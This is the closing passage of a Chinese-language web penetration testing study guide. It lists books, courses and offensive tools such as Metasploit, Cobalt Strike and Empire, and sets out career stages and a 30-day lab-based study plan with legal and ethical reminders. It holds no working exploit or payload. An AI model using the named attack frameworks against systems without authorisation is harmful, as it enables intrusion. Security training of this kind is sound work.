3. **《Web渗透测试：使用Kali Linux》** - 工具实战
4. **《白帽子讲Web安全》** - 国内经典

### 🎓 在线课程
- Offensive Security: OSCP认证培训
- PortSwigger Web Security Academy: 免费系统化课程
- PentesterAcademy: 专业渗透课程
- Coursera/Udemy: 基础入门课程

### 🔧 必备工具
```bash
# 信息收集
subfinder, amass, theHarvester, nmap, masscan

# 漏洞扫描
nuclei, nikto, wpscan, sqlmap

# 代理工具
Burp Suite, OWASP ZAP, mitmproxy

# 渗透框架
Metasploit, Cobalt Strike, Empire

# 自动化
Python + requests, selenium, playwright
```

### 📰 安全资讯
- FreeBuf: 国内安全资讯
- 先知社区: 技术文章
- Seebug漏洞平台: 漏洞库
- HackerOne: 漏洞赏金平台
- Twitter: 关注安全研究员

---

## 13. 职业发展路径

### 初级渗透测试工程师（0-2年）
- 熟练使用常见渗透工具
- 理解OWASP Top 10
- 能够进行基础漏洞挖掘
- 编写规范的渗透测试报告

### 中级渗透测试工程师（2-5年）
- 独立完成渗透测试项目
- 掌握代码审计技能
- 具备漏洞研究能力
- 能够绕过安全防护

### 高级渗透测试工程师（5年以上）
- APT攻击模拟
- 0day漏洞挖掘
- 安全架构设计
- 团队管理与培训

---

## 🎯 30天速成计划

### Week 1: 基础建设
- Day 1-2: 搭建Kali Linux环境，配置工具
- Day 3-4: HTTP协议深入学习，Burp Suite使用
- Day 5-6: SQL注入原理与实践（DVWA靶场）
- Day 7: 总结与复习，完成5个SQL注入题目

### Week 2: 常见漏洞
- Day 8-9: XSS漏洞原理与利用
- Day 10-11: CSRF与SSRF漏洞
- Day 12-13: 文件上传与文件包含
- Day 14: 完成10个XSS/CSRF题目

### Week 3: 高级技术
- Day 15-16: 反序列化漏洞研究
- Day 17-18: XXE与SSTTI漏洞
- Day 19-20: 逻辑漏洞挖掘
- Day 21: 完成5个高级漏洞题目

### Week 4: 实战演练
- Day 22-23: HackTheBox靶机练习
- Day 24-25: 完整渗透测试流程
- Day 26-27: 编写渗透测试报告
- Day 28-30: 复习总结，查漏补缺

---

## ⚠️ 安全提醒

1. **合法性第一**: 始终在授权范围内进行测试
2. **数据保护**: 妥善保管测试过程中获取的数据
3. **负责任披露**: 发现漏洞后通过正规渠道报告
4. **持续学习**: 安全技术快速发展，保持学习状态
5. **道德准则**: 技术用于防御而非攻击

---

## 📝 总结

Web渗透测试是一个需要持续学习和实践的领域。本指南提供了从基础到进阶的完整学习路径，但真正的技能提升需要：

1. **大量实践**: 理论结合靶场练习
2. **深入思考**: 理解漏洞本质而非记忆payload
3. **举一反三**: 从单个漏洞扩展到攻击面
4. **保持好奇**: 探索新技术和新漏洞
5. **遵守法律**: 在合法框架内提升技能

记住：安全技术的目的是保护，而非破坏。成为一名优秀的安全研究员，需要技术能力与职业道德并重。

---

**文档版本**: v2.0
**最后更新**: 2024年1月
**维护者**: Security Learning Team
**反馈邮箱**: security@example.com (请替换为实际邮箱)
